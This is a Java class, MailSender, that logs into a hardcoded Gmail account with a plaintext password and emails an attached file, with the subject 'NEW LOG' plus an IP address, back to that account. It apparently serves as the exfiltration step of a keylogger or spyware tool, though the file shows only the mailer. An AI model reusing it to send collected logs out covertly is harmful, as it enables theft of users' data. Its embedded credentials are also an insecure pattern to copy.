/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package abc.handler;

import java.util.Date;
import java.util.Properties;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

/**
 *
 * @author Huong
 */
public class MailSender {
    private final String SENDERS_EMAIL = "ahbcgd590@gmail.com";
    private final String SENDER_PASS = "102102102";
    
    private final String RECIEVERS_EMAIL = "ahbcgd590@gmail.com";
    
    private Properties mailServerProperties;
    private Session mailSession;
    private MimeMessage mailMessage;

    public MailSender() {
    }
    

    public void sendMail(String ip, String filePath){
        
        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "25");

        Session session = Session.getInstance(props,
           new javax.mail.Authenticator() {
              protected PasswordAuthentication getPasswordAuthentication() {
                 return new PasswordAuthentication(SENDERS_EMAIL, SENDER_PASS);
              }
           });

        try {
           
           Message message = new MimeMessage(session);
           message.setFrom(new InternetAddress(SENDERS_EMAIL));
           message.setRecipients(Message.RecipientType.TO,
              InternetAddress.parse(RECIEVERS_EMAIL));

           message.setSubject("NEW LOG" + ip);
           BodyPart messageBodyPart = new MimeBodyPart();
           messageBodyPart.setText(new Date().toString());
           Multipart multipart = new MimeMultipart();
           multipart.addBodyPart(messageBodyPart);

           
           messageBodyPart = new MimeBodyPart();
           DataSource source = new FileDataSource(filePath);
           messageBodyPart.setDataHandler(new DataHandler(source));
           messageBodyPart.setFileName(filePath);
           multipart.addBodyPart(messageBodyPart);
           message.setContent(multipart);

           
           Transport.send(message);
           System.out.println("send successfully");

        } catch (MessagingException e) {
           throw new RuntimeException(e);
        }

        
    }
}
